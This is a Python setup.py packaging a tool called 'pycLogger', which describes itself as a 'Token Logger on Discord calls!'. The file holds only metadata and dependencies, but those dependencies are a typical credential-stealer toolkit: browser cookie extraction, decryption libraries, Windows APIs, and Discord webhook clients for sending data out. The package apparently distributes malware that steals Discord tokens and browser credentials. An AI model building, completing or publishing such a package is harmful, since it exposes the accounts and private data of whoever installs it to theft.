from setuptools import find_packages, setup
setup(
    name='pycLogger',
    packages=find_packages(),
    version='0.1.0',
    description='Token Logger on Discord calls!',
    author='Me',
        install_requires=[
        "requests>=2.30.0",
        "fastapi",
        "pydantic",
        "uvicorn",
        "pycryptodome",
        "pywin32",
        "pypiwin32",
        "dhooks",
        "psutil",
        "browser_cookie3",
        "cryptography",
        "discord_webhook"
    ]
)